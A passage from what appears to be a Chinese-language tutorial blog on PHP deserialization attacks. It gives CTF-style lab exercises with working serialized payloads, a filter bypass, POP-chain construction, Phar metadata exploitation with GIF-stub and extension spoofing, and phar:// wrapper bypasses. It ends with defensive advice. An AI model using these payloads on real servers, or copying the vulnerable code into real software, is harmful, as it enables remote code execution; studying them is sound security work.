alt="习题代码"></p><p>2.解析:</p><p>观察代码,上部分定义了类,下部分是过滤的代码,过滤后可以通过传参形式以反序列构造一个对象,然后将对象用字符串打印出来,触发上半部分的__toString()魔术方法,去执行预计代码。</p><p>既然上半部分定义了类,下半部分只是过滤的代码,可以将上半部分抽离出来,查看序列化的结果,以便于反序列化</p><p><img src="/images/1666013753336.png" alt="习题解析"></p><p>3.同理,构造-&gt;序列化</p><p><img src="/images/1666013841120.png" alt="习题解析"></p><p>4.过滤:代码块中通过正则,不区分大小写的o,c字符,去匹配字符的冒号后的数字来做校验</p><p><img src="/images/1666014009275.png" alt="过滤代码"></p><p>5.可以通过+4等价代替 4 从而绕过检测(+  url编码为%2b)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload  O:%2b4:&quot;baby&quot;:1:&#123;s:4:&quot;file&quot;;s:5:&quot;1.txt&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/1666013969450.png" alt="绕过过滤"></p><h4 id="四-开始上手"><a href="#四-开始上手" class="headerlink" title="四.开始上手"></a>四.开始上手</h4><p>任务:读取flag.GG的love</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>, <span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod2 = <span class="string">&quot;字符串拼接&quot;</span> . <span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str1-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span> . <span class="string">&quot;GG的love&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解析:</p><p>涉及到对魔术方法的理解,需要回到初始部分,了解魔术方法的触发条件,建议依次由代码后头往前分析</p><p><img src="/images/1666014602193.png" alt="习题解析"></p><p><img src="/images/1666014651360.png" alt="习题解析"></p><p><img src="/images/1666014675364.png" alt="习题解析"></p><p><img src="/images/1666014675364.png" alt="习题解析"></p><p><img src="/images/1666014708480.png" alt="习题解析"></p><p><img src="/images/1666014760402.png" alt="习题解析"></p><p><img src="/images/1666014780681.png" alt="习题解析"></p><p>解题:</p><p>代码构造: 通过 __construct()魔术方法,创建对象的时候自动调用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload</span><br><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new  B();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new  C();</span><br><span class="line">    &#125;</span><br><span class="line">    public function test1()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new  D();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($test2, $arr)</span><br><span class="line">    &#123;</span><br><span class="line">        $s1 = $this-&gt;mod1;</span><br><span class="line">        $s1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class D</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new  E();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod2 = &quot;字符串拼接&quot; . $this-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class E</span><br><span class="line">&#123;</span><br><span class="line">    public $str1;</span><br><span class="line">    public $str2;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str1 = new  GetFlag();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str1-&gt;get_flag();</span><br><span class="line">        return &quot;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">    public function get_flag()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;flag:&quot; . &quot;GG的love&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new A;</span><br><span class="line">echo serialize($c);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload </span><br><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;mod1&quot;;O:1:&quot;B&quot;:2:&#123;s:4:&quot;mod1&quot;;O:1:&quot;C&quot;:2:&#123;s:4:&quot;mod1&quot;;O:1:&quot;D&quot;:2:&#123;s:4:&quot;mod1&quot;;O:1:&quot;E&quot;:2:&#123;s:4:&quot;str1&quot;;O:7:&quot;GetFlag&quot;:0:&#123;&#125;s:4:&quot;str2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>实例化对象,输出序列化结果</p><p><img src="/images/1666055855622.png" alt="输出序列化结果"></p><p>结果</p><p><img src="/images/1666056041793.png" alt="结果"></p><p>总结:从习题中不难看出, 漏洞的主要的原因就是在反序列化的过程中，通过我们的恶意篡改会产生魔法函数绕过，字符逃逸，远程命令执行等漏洞。 </p><h3 id="Phar文件和Phar协议"><a href="#Phar文件和Phar协议" class="headerlink" title="Phar文件和Phar协议"></a>Phar文件和Phar协议</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入unserialize()，随着代码安全性越来越高，利用难度也越来越大 假如没有unserialize(),没了传参接口那该怎么利用咧,这就需要 利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作 . 即通过本地构造phar文件把恶意代码本地序列化好,在将phar文件上传到目标网站,最后通过phar协议配合文件系统函数反序列化phar文件,达到预期目的.</span><br></pre></td></tr></table></figure><h4 id="phar文件详解"><a href="#phar文件详解" class="headerlink" title="phar文件详解"></a>phar文件详解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Phar文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</span><br><span class="line">phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容。</span><br></pre></td></tr></table></figure><p>phar文件分为四层</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?&gt; 结尾，否则无法识别。xxx可以为自定义内容。</span><br><span class="line">//简单地说就是告诉系统自己是一个什么样的文件,声明文件后缀</span><br><span class="line"></span><br><span class="line">manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。</span><br><span class="line">//存放序列化的内容</span><br><span class="line"></span><br><span class="line">content:被压缩文件的内容</span><br><span class="line"></span><br><span class="line">signature (可空):签名，放在末尾。</span><br></pre></td></tr></table></figure><h4 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h4><h5 id="1-准备环境"><a href="#1-准备环境" class="headerlink" title="1.准备环境"></a>1.准备环境</h5><p>1.1Phar需要 PHP &gt;&#x3D; 5.2<br>1.2在php.ini中将phar.readonly设为Off（注意去掉前面的分号）</p><p><img src="/images/1666090809497.png" alt="phpstudy配置"></p><h5 id="2-具体代码"><a href="#2-具体代码" class="headerlink" title="2.具体代码:"></a>2.具体代码:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var $output = &#x27;phpinfo();&#x27;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">$o = new AnyClass();</span><br><span class="line">$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/1666090498354.png" alt="phar文件生成"></p><p>①要序列化的内容,即起到的作用同上文练习题里的test.php文件一样,我们把要构造的恶意代码放进来进行序列化</p><p>②上下部分的类命一致(其它选项可以保持默认)</p><h5 id="2-1访问phar-php文件-生成phar-phar文件"><a href="#2-1访问phar-php文件-生成phar-phar文件" class="headerlink" title="2.1访问phar.php文件,生成phar.phar文件"></a>2.1访问phar.php文件,生成phar.phar文件</h5><p><img src="/images/1666090959788.png" alt="phar.phar文件生成"></p><h5 id="2-2查看phar文件内容"><a href="#2-2查看phar文件内容" class="headerlink" title="2.2查看phar文件内容"></a>2.2查看phar文件内容</h5><p><img src="/images/1666091068301.png" alt="phar文件内容查看"></p><p>总结:phar.phar文件是在我们本地生成,然后上传到目标网站,配合phar协议和相关函数,造成反序列的杀伤链.所以不用担心前置的开启phpstudy配置操作会影响后续操作.利用条件核心在于1.phar文件要能够上传到服务器端。2.要有可用的魔术方法作为“跳板”。3.文件操作函数的参数可控，且   .&#x2F;    ..&#x2F;    phar等特殊字符没有被过滤。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件:"></a>利用条件:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.phar文件要能够上传到服务器端。</span><br><span class="line">2.要有可用的魔术方法作为“跳板”。</span><br><span class="line">3.文件操作函数的参数可控，且   ./    ../    phar等特殊字符没有被过滤</span><br></pre></td></tr></table></figure><h5 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h5><p>php大部分的文件系统函数在通过phar:&#x2F;&#x2F;伪协议解析phar文件时，都会将meta-data进行反序列化，知道创宇测试后发布的受影响的函数如下 :</p><p><img src="/images/1666091518005.png" alt="文件操作函数"></p><h4 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧:"></a>绕过技巧:</h4><h5 id="1-环境限制了phar不能出现在前面的字符里"><a href="#1-环境限制了phar不能出现在前面的字符里" class="headerlink" title="1.环境限制了phar不能出现在前面的字符里"></a>1.环境限制了phar不能出现在前面的字符里</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure><h5 id="2-验证文件格式"><a href="#2-验证文件格式" class="headerlink" title="2.验证文件格式"></a>2.验证文件格式</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br></pre></td></tr></table></figure><h5 id="3-绕过上传后缀检查"><a href="#3-绕过上传后缀检查" class="headerlink" title="3.绕过上传后缀检查"></a>3.绕过上传后缀检查</h5><p>将phar.phar更名为phar.gif 不影响phar文件的最终执行</p><p><img src="/images/1666091830216.png" alt="phar.gif"></p><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><h5 id="一-初步了解"><a href="#一-初步了解" class="headerlink" title="一.初步了解"></a>一.初步了解</h5><p>任务:目标1.php界面任务执行phpinfo()</p><p>1.php代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Files</span><br><span class="line">&#123;</span><br><span class="line">    var $b = &#x27;echo ok;&#x27;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//$file = &#x27;../&#x27;.$_GET[&#x27;file&#x27;];</span><br><span class="line">is_dir(&#x27;phar://phar.phar/test.txt&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/images/1666095753278.png" alt="1.php界面"></p><p>解题:</p><p>分析:存在可控点以及文件操作函数,路径指向phar协议.可以直接访问1.php文件,传参执行恶意的代码</p><p>一  phar.php页面将恶意代码序列化</p><p><img src="/images/1666096005482.png" alt="phar.phar文件生成"></p><p>①保持类名一致</p><p>②构造恶意代码</p><p>③访问phar.php文件生成phar.phar文件</p><p>④可以查看phar.phar文件(.metadata.bin放置着序列化的恶意代码)</p><p>二.1.php页面执行phpinfo()</p><p><img src="/images/1666095558119.png" alt="目标界面执行phpinfo"></p><h5 id="二-进一步了解"><a href="#二-进一步了解" class="headerlink" title="二.进一步了解"></a>二.进一步了解</h5><p>通过phar协议读出Destruct called</p><p>目标文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;Destruct called&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">file_get_contents($filename);</span><br></pre></td></tr></table></figure><p><img src="/images/1666094826497.png" alt="2.php"></p><p>分析:存在可控点以及文件操作函数file_get_contents,需要通过phar协议的反序列化功能,配合file_get_contents函数,执行phar.phar文件内序列化后的代码</p><p>1.同理,构造phar.phar文件,将恶意代码序列化存入phar.phar的.metadata.bin文件中</p><p><img src="/images/1666098815001.png" alt="phar.phar文件生成"></p><p>①保持类名一致</p><p>②访问phar.php文件</p><p>③生成phar.phar文件</p><p>2.访问目标文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:phar://phar.phar/test.txt</span><br></pre></td></tr></table></figure><p><img src="/images/1666098582374.png" alt="完成执行"></p><h6 id="拓展-练习"><a href="#拓展-练习" class="headerlink" title="拓展:练习"></a>拓展:练习</h6><p>具体代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $num = 2;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;num === 1) &#123;</span><br><span class="line">            echo &#x27;flag&#123;123&#125;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo file_get_contents($_GET[&#x27;data&#x27;]);</span><br></pre></td></tr></table></figure><p>(关键在于构建恶意的代码,关注点在$num &#x3D; 2 —&gt;$num&#x3D;1)</p><p><img src="/images/1666097212668.png" alt="拓展练习"></p><h5 id="三-再进一步了解"><a href="#三-再进一步了解" class="headerlink" title="三.再进一步了解"></a>三.再进一步了解</h5><p>任务:通过phar协议执行phpinfo</p><p>详细:通过upload_file.php,index.php,page.php文件模拟攻击目标,使用phar文件和phar协议执行反序列化,达到任意代码执行效果.</p><h6 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h6><p>1.www&#x2F;目录(网站根目录)下放upload_file.php,index.php,page.php文件</p><p>2.www&#x2F;目录(网站根目录)下新建upload_file文件夹</p><p>3.各个文件内容及解释</p><p>upload_file.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123;</span><br><span class="line">    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;];</span><br><span class="line">    echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line"></span><br><span class="line">    if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">      &#123;</span><br><span class="line">      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class="line">      &#125;</span><br><span class="line">    else</span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],</span><br><span class="line">      &quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">      echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">else</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;Invalid file,you can only upload gif&quot;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>upload_file.php:内容做了一个上传文件后缀的限制</p><p><img src="/images/1666093061302.png" alt="upload_file.php"></p><p>index.php 提供一个上传界面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://localhost/upload_file&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/1666093202839.png" alt="index.php"></p><p>page.php 目标可控点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var $output = &#x27;echo &quot;ok&quot;;&#x27;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure><p><img src="/images/1666093391170.png" alt="page.php"></p><h6 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h6><p>1.目标存在可控点以及文件操作函数</p><p><img src="/images/1666093580339.png" alt="page.php分析"></p><p>2.只有upload_file.php的对上传文件的后缀限制</p><p><img src="/images/1666094280884.png" alt="upload_file.php"></p><h6 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h6><p>1.构造上传的phar文件</p><p>①通过phar.php生成的phar.phar文件,将phar.phar文件更改为phar.gif文件</p><p><img src="/images/1666093764231.png" alt="phar文件生成"></p><p>2.上传文件和执行</p><p>①成功上传②page页面成功执行phpinfo</p><p><img src="/images/1666094091408.png" alt="page页面执行phpinfo"></p><h4 id="反序列化漏洞的防御"><a href="#反序列化漏洞的防御" class="headerlink" title="反序列化漏洞的防御"></a>反序列化漏洞的防御</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">和大多数漏洞一样，反序列化的问题也是用户参数的控制问题引起的，所以最好的预防措施: </span><br><span class="line"></span><br><span class="line">1.  不要把用户的输入或者是用户可控的参数直接放进反序列化的操作中去。</span><br><span class="line">2. 在进入反序列化函数之前,对参数进行限制过滤,例如长度等</span><br><span class="line">3.白名单为主,限制反序列化的类,从而减小影响</span><br><span class="line">4.鉴权，反序列化接口进行鉴权，仅允许后台管理员等特许人员才可调用</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 序列化与反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 序列化与反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
